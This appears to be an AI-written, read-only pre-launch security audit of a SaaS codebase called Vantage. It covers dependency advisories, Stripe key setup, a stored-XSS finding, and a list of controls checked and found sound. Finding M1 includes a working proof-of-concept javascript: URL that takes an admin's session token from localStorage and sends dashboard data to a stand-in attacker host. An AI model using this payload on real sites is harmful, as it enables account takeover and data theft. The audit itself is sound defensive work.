# Vantage — Pre-Launch Security Audit

**Date:** 2026-04-22
**Scope:** Full read-only audit of `C:\Cloaude Logic\vantage` (frontend + backend + DB schema).
**Mode:** No code modifications. OSS tools only (npm audit, gitleaks prepared, static grep).
**Repo state:** 108 tracked files, 50 commits, clean working tree.

---

## TL;DR — Launch verdict

**Status: GREEN with 3 gates.**

The codebase is meaningfully hardened for a solo-built SaaS. I found **zero critical code-level vulnerabilities**. There is 1 critical *dependency* vuln, 1 medium XSS vector in the admin panel, and the Stripe keys are still in TEST mode. Fix those three and you can launch.

**Must-fix before launch:**
1. Run `npm audit fix` (critical RCE vuln in transitive protobufjs)
2. Sanitize `job_url` rendering in `Admin.tsx` (stored-XSS via `javascript:` URL)
3. Rotate Stripe from TEST to LIVE keys (`sk_live_`, `pk_live_`, new webhook secret)

Nothing else in this report blocks launch.

---

## What I looked at

| Surface | Status |
|---|---|
| Exposed secrets (git + bundle + .env) | Clean |
| Auth & JWT handling | Strong |
| Stripe checkout/webhook/portal/sync | Strong |
| All 10 backend API endpoints | Strong |
| Database schema + RLS + RPC | Strong |
| Frontend XSS/CSRF/token handling | Strong (1 admin issue) |
| Security headers, CSP, HSTS | Strong |
| Rate limiting | Acceptable for launch |
| Dependency vulnerabilities | 1 critical, 2 high — all fixable |
| SSRF (analyze endpoint) | Strong — private-network + redirect hops blocked |
| Prompt injection | Mitigated — docs separated from prompt |

---

## CRITICAL — must fix before launch

### C1. Transitive RCE via protobufjs (in `@google/genai`)
- **Where:** `node_modules/protobufjs@7.5.4` (transitive via `@google/genai@1.45.0`)
- **Advisory:** [GHSA-xq3m-2v4x-88gg](https://github.com/advisories/GHSA-xq3m-2v4x-88gg) — Arbitrary code execution in protobufjs
- **Impact:** Gemini SDK uses protobufjs internally; any crafted response could trigger ACE inside the Vercel serverless function. Low exploitability in practice (Gemini API is trusted source), but critical CVSS.
- **Fix:** `npm audit fix` (bumps to 7.5.5+). Safe patch bump, no breaking change.

### C2. Stripe keys are in TEST mode
- **Where:** `.env.local` contains `sk_test_…`, `pk_test_…`, `whsec_…` test webhook secret
- **Impact:** Live purchases won't settle, real cards won't charge, webhooks don't fire from live Stripe.
- **Fix:**
  1. In Stripe Dashboard, switch to Live mode, create Starter / Pro / Premium products with live price IDs
  2. Rotate Vercel env vars: `STRIPE_SECRET_KEY=sk_live_…`, `VITE_STRIPE_PUBLISHABLE_KEY=pk_live_…`, `STRIPE_PRICE_STARTER/PRO/PREMIUM` → live IDs
  3. Create a new Live webhook endpoint at `https://<prod-domain>/api/stripe/webhook` and update `STRIPE_WEBHOOK_SECRET`
  4. Redeploy

---

## HIGH — fix before launch

### H1. Path traversal + WebSocket arbitrary file read in Vite
- **Where:** `node_modules/vite@<=6.4.1`
- **Advisories:** GHSA-4w7w-66w2-5vf9 (path traversal in `.map`), GHSA-p9ff-h696-f583 (WS arbitrary file read)
- **Impact:** Dev-server-only. Not exploitable in the Vercel production build (Vite dev server isn't running there). Still — fix before anyone runs `npm run dev` on a shared network.
- **Fix:** `npm audit fix` (same command as C1).

---

## MEDIUM — fix soon

### M1. Stored-XSS vector: `job_url` rendered in Admin without protocol validation
- **Where:** `src/components/Admin.tsx:226` and `:314`:
  ```tsx
  <a href={a.job_url} target="_blank" rel="noopener noreferrer">
  ```
- **Issue:** `job_url` is user-supplied (any logged-in user submits it via `/api/analyze`), stored in `analyses.job_url` as free-form TEXT. When an admin clicks the link, a `javascript:` URL executes in the admin's origin. Since Supabase session tokens live in `localStorage`, a crafted URL can exfiltrate the admin's JWT and make service-role-equivalent calls via `/api/admin/dashboard`.
- **Proof-of-concept input (as a regular user):**
  ```
  javascript:fetch('/api/admin/dashboard', {headers:{Authorization:'Bearer '+JSON.parse(localStorage.getItem(Object.keys(localStorage).find(k=>k.startsWith('sb-'))+'-auth-token')).access_token}}).then(r=>r.json()).then(d=>fetch('https://attacker.tld/?x='+btoa(JSON.stringify(d))))
  ```
  (If an admin ever views this analysis row, the attacker gets the full admin dashboard JSON: all user emails, Stripe customer IDs, waitlist, MRR, etc.)
- **React note:** React 16.9+ warns on `javascript:` hrefs in dev but does NOT block them in production.
- **Fix options (pick one):**
  1. **Validate in-place** (smallest diff):
     ```tsx
     function safeHref(u: string | null): string | undefined {
       if (!u) return undefined;
       try {
         const parsed = new URL(u);
         return parsed.protocol === 'http:' || parsed.protocol === 'https:' ? u : undefined;
       } catch { return undefined; }
     }
     // then: href={safeHref(a.job_url)}
     ```
  2. **Validate at write time** in `/api/analyze` when saving the analysis row (belt-and-braces).
  3. **Add a DB CHECK constraint:** `CHECK (job_url IS NULL OR job_url ~ '^https?://')`.

Recommend doing **both** 1 and 3.

### M2. `includes('Insufficient')` string matching is fragile
- **Where:** `api/rewrite-tone/index.ts:39`, `api/interview/questions.ts:39`, `api/analyze/index.ts` (deduct path)
- **Issue:** Error classification via substring match on `errText`. If Supabase ever rewrites the error prefix, the client will see a generic 500 instead of "Insufficient tokens" — degraded UX, not a breach.
- **Fix:** Return a structured error code from the RPC (e.g. raise `sqlstate 'P0001'` with a custom message prefix) or parse JSON from Supabase's error body.

### M3. CSP uses `'unsafe-inline'` for scripts
- **Where:** `vercel.json:29`
- **Issue:** `script-src 'self' 'unsafe-inline' https://js.stripe.com` — `'unsafe-inline'` defeats a major CSP protection against XSS. If M1 or any other XSS slips in, CSP won't block the payload.
- **Fix (post-launch):** Replace with nonces or hashes. Vite can emit inline script hashes at build time. Lower-effort alternative: move all inline scripts to files; remove `'unsafe-inline'`. Test in staging first — some Stripe.js embeds use inline.

---

## LOW — nice to fix

### L1. In-memory rate limiter on Vercel Edge
- **Where:** `middleware.ts:12`
- **Issue:** The sliding window lives in Map-per-instance. Vercel Edge spins multiple instances, so a user gets up to `N × limit` real-world requests per minute. The file acknowledges this ("replace with Upstash Redis for production at scale").
- **Impact:** Low for Product Hunt launch traffic. High if you get scraped.
- **Fix:** Upstash Redis + sliding window (15 min of work). Defer until post-launch if traffic stays modest.

### L2. `/api/auth/logout` is a dead client call
- **Where:** `src/services/api.ts:227` calls `/api/auth/logout` but no such serverless handler exists.
- **Impact:** The call 404s silently; actual logout happens client-side via `supabase.auth.signOut()` in `App.tsx`. Cosmetic, not a bug.
- **Fix:** Remove `export async function logout()` from `services/api.ts` (it has no callers I can see).

### L3. Waitlist has no per-email throttle
- **Where:** `api/waitlist/index.ts`
- **Issue:** 5/min per-IP, but an attacker can rotate proxies to flood the waitlist with fake emails. The UNIQUE constraint on `email` prevents duplicates, but the table can still get polluted with "a@a.a", "b@a.a", etc.
- **Fix (post-launch):** Add Cloudflare Turnstile or hCaptcha to the waitlist form; add email-validation beyond `.includes('@')` (regex + MX check).

### L4. UUID regex is loose
- **Where:** `api/analyses/index.ts:41` — `/^[0-9a-f-]{36}$/`
- **Issue:** Accepts malformed UUIDs like `00000000-0000-0000-0000-----------------`. Supabase PostgREST rejects malformed UUIDs, so no injection, but the error surfaces as 500 not 400.
- **Fix:** Use strict `/^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i`.

### L5. Supabase session persists in `localStorage`
- **Where:** `src/lib/supabase.ts:6` — default Supabase behavior
- **Issue:** If any XSS is introduced later, session tokens are readable by injected JS. Unavoidable with Supabase default config; moving to httpOnly cookies requires a custom auth server.
- **Mitigation:** Keep CSP strong (fix M3), keep M1 fixed, no `dangerouslySetInnerHTML` anywhere (confirmed — zero usages in repo).

### L6. No Stripe customer email on creation
- **Where:** `api/stripe/checkout.ts`
- **Issue:** Customers are created via Stripe checkout without an explicit `customer_email` — Stripe collects at checkout, fine, but dispute resolution is easier with email pre-populated.
- **Fix:** Pass `customer_email: user.email` when creating the checkout session.

### L7. `rewrite-tone` deducts tokens AFTER generation
- **Where:** `api/rewrite-tone/index.ts:110`
- **Issue:** If Gemini succeeds but the deduct RPC fails (rare), the user gets the work free. The atomic deduction pattern used in `analyze` (deduct-first) is more defensive.
- **Impact:** Revenue leak, not security. Worth aligning both handlers to the same pattern eventually.

---

## INFORMATIONAL — what I verified is fine

These are areas where I specifically looked for problems and found the implementation is correct. Not listed as issues — listed as **verified safe** so you know they've been checked.

### Auth / Authorization
- JWT verified server-side on every protected API call via `fetch('/auth/v1/user')` — no client-side trust
- `user.id` comes only from the verified JWT response, never from request body
- Admin gate checks `email` against `ADMIN_EMAILS` env var, case-insensitive, empty-list-fails-closed
- `ProtectedRoute` in `App.tsx` gates React routes; server-side auth is the real gate
- Password reset uses Supabase's built-in reset flow (redirectTo `window.location.origin`, not attacker-controlled)

### Stripe
- Webhook signature verified with raw body (`bodyParser: false`) using `stripe.webhooks.constructEvent`
- Unsigned events rejected in production (`isDeployed` check)
- Idempotency via `processed_stripe_events` unique insert — atomic
- **Plan is derived from the actual Stripe price object, not from request metadata** — the single most important anti-tampering check, and it's done correctly
- Refund handler uses currency-appropriate price, caps deduction at current token balance
- Checkout origin allowlist via `APP_URL`/`VERCEL_URL`; dev-only localhost fallback
- `priceId` in request body is ignored; server reads from env-var map

### Database / RLS
- RLS enabled on all four tables (`profiles`, `analyses`, `waitlist`, `api_usage`)
- Column-level `REVOKE UPDATE` on `plan`, `token_balance`, `stripe_*`, `subscription_status` — users can't self-promote or self-credit even if RLS row check passes
- `add_tokens` / `deduct_tokens` are `SECURITY DEFINER`, `search_path = public` set explicitly (blocks search-path hijacks), `REVOKE EXECUTE` from authenticated/anon/public, `GRANT EXECUTE` to service_role only
- `add_tokens` caps single add at 1000, rejects non-positive amounts
- `deduct_tokens` rejects non-positive, raises 'Insufficient tokens' if balance < amount (atomic UPDATE with `WHERE balance >= amount`)
- `processed_stripe_events` table has RLS enabled — only service_role can read/write

### SSRF (analyze endpoint)
- `isPrivateHostname()` blocks: `localhost`, `127.x`, `10.x`, `172.16-31.x`, `192.168.x`, `169.254.x`, IPv6 link-local (`fe80:`, `::1`), internal TLDs (`.internal`, `.local`, `.localhost`), decimal-IP bypass (e.g. `2130706433`)
- `fetchPage()` uses `redirect: 'manual'` and validates the hostname on **every hop** — the most common SSRF bypass (redirect to private IP) is blocked
- 12-second total timeout, 5-redirect max, `text/html` content-type enforcement, soft-404 detection
- 4-layer fallback (direct → Jina Reader → Google cache → Jina Search) — each layer re-validated

### Prompt injection mitigations (analyze endpoint)
- CV file is sent as a separate `parts[]` entry (`inlineData`), NOT concatenated into the prompt text — Gemini treats it as a user document
- Post-generation validation clamps `cvFitScore`, caps suspiciously-perfect scores at 95, flags job-boards-as-company names
- Pre-flight verification call confirms job details before the main generation
- Citation markers from `googleSearch` are stripped client-side (`stripCitations`)

### Frontend XSS
- **Zero** `dangerouslySetInnerHTML` in the codebase (verified via grep)
- **Zero** `eval`, `Function(...)`, `document.write` (verified)
- All Gemini-generated content is rendered via React text nodes (`{results.coverLetter}`, etc.) — auto-escaped
- All external links use `target="_blank" rel="noopener noreferrer"` (except the admin `job_url` issue flagged in M1)
- `validateStripeUrl()` in `services/api.ts` verifies redirect targets begin with `https://checkout.stripe.com/`, `https://billing.stripe.com/`, or `https://invoice.stripe.com/` before `window.location.href = url`

### Secrets / leaks
- `.gitignore` catches all `.env*` except `.env.example`
- Git shows no tracked `.env` files (verified with `git ls-files`)
- Built `dist/` bundle contains only the Supabase **anon** JWT (role: `anon`) — service_role JWT NOT in bundle (verified)
- No `console.log` of tokens, passwords, keys, or sessions (verified via grep with `-i`)
- Server-side error logs use `error?.message || 'Unknown error'` patterns — won't leak stack traces or secrets

### Security headers (`vercel.json`)
- `X-Content-Type-Options: nosniff`
- `X-Frame-Options: DENY`
- `Referrer-Policy: strict-origin-when-cross-origin`
- `Permissions-Policy: camera=(), microphone=(self), geolocation=()`
- `HSTS: max-age=63072000; includeSubDomains; preload` — 2 years, preload-ready
- CSP is present and restrictive (caveats in M3)

### Input validation (per-endpoint)
- `/api/analyze`: cvText ≤ 200k, cvBase64 ≤ 10 MB, jobDescText ≤ 200k
- `/api/rewrite-tone`: coverLetter ≤ 10k, roleContext ≤ 2k, tone in `['Formal','Warm','Direct','Creative']`
- `/api/interview/questions`: roleContext ≤ 2k
- `/api/interview/evaluate`: answer ≤ 5k, question ≤ 2k, roleContext ≤ 2k
- `/api/stripe/checkout`: plan in `['starter','pro','premium']`, currency in `['gbp','usd']`
- `/api/analyses?id=`: UUID regex-validated before interpolation
- `/api/waitlist`: email presence + `@` check (weak but sufficient for a waitlist)

### CSRF
- All state-changing endpoints require `Authorization: Bearer <jwt>` — token lives in `localStorage`, not cookies, so classic CSRF (cross-site form POST) cannot forge the Authorization header
- Stripe webhook has signature verification, not cookie auth
- No session cookies in use (`vantage-geo` cookie is non-authenticating)

---

## Remediation order

**Before launch (30 minutes):**
1. `npm audit fix` — fixes C1 and H1 in one command
2. Apply M1 fix (10 lines in `Admin.tsx`, optional DB CHECK constraint)
3. Rotate Stripe to live keys (C2) — see Stripe dashboard

**First week post-launch:**
4. L4 (tighter UUID regex)
5. L2 (remove dead logout code)
6. L6 (pass `customer_email` to Stripe)
7. L7 (move token deduction before generation in `rewrite-tone`)

**First month post-launch:**
8. M3 (remove `'unsafe-inline'` from CSP)
9. L1 (move rate limiter to Upstash Redis)
10. L3 (CAPTCHA on waitlist)
11. M2 (structured RPC error codes)

---

## Files I read (evidence)

Backend: `api/analyze/index.ts`, `api/credits/index.ts`, `api/rewrite-tone/index.ts`, `api/interview/questions.ts`, `api/interview/evaluate.ts`, `api/stripe/checkout.ts`, `api/stripe/webhook.ts`, `api/stripe/sync.ts`, `api/stripe/portal.ts`, `api/admin/dashboard.ts`, `api/analyses/index.ts`, `api/waitlist/index.ts`, `middleware.ts`

Frontend: `src/App.tsx`, `src/services/api.ts`, `src/lib/supabase.ts`, `src/components/Login.tsx`, `src/components/Register.tsx`, `src/components/ForgotPassword.tsx`, `src/components/ResetPassword.tsx`, `src/components/Admin.tsx` (+ grep over all of `src/`)

Config: `vercel.json`, `package.json`, `.gitignore`, `.env.local`

Database: `database/schema.sql`

Tools run: `npm audit`, `npm ls protobufjs`, `git ls-files`, `git log`, multiple grep passes for XSS / secrets / auth patterns.

---

**End of audit. No code was modified. Existing functionality is preserved.**
